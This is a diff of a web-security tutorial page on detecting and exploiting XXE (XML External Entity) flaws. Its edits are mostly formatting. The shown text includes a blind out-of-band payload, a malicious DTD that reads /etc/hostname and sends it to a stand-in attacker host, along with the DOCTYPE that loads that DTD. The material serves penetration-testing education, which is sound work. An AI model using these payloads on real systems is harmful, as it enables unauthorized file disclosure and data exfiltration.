@@ -28,7 +28,7 @@ description: "Learn to detect and exploit XXE (XML External Entity) vulnerabilit
 2. Edit a data value in the XML returned in the app's response to use the defined external entity.
 
 {{< hint style=notes >}}
-**Note**: to systematically test for XXE, test each data node in the XML individually using your defined entity to see if it appears in the response.
+To systematically test for XXE, test each data node in the XML individually using your defined entity to see if it appears in the response.
 {{< /hint >}}
 
 ***
@@ -80,21 +80,21 @@ description: "Learn to detect and exploit XXE (XML External Entity) vulnerabilit
 
 1. Start a web server and host on `http://attacker.com/example.dtd` this malicious dtd.
 
-```xml
-<!ENTITY % file SYSTEM "file:///etc/hostname">
-<!ENTITY % stack "<!ENTITY &#x25; exfil SYSTEM 'http://attaccker.com/?x=%file;'>">
-%stack;
-%exfil;
-```
+    ```xml
+    <!ENTITY % file SYSTEM "file:///etc/hostname">
+    <!ENTITY % stack "<!ENTITY &#x25; exfil SYSTEM 'http://attaccker.com/?x=%file;'>">
+    %stack;
+    %exfil;
+    ```
 
 2. Add this external entity
 
-```xml
-<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/example.dtd"> %xxe;]>
-```
+    ```xml
+    <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/example.dtd"> %xxe;]>
+    ```
 
 {{< hint style=notes >}}
-**Note**: This technique might not work with multiline files.
+This technique might not work with multiline files.
 {{< /hint >}}
 
 ### Via error messages
@@ -109,7 +109,7 @@ Trigger an XML parsing error message with the file contents.
 ```
 
 {{< hint style=notes >}}
-**Note**: This works if you notice an error in the response when detecting with OAST (e.g., the reflected URL entered).
+This works if you notice an error in the response when detecting with OAST (e.g., the reflected URL entered).
 {{< /hint >}}
 
 ---
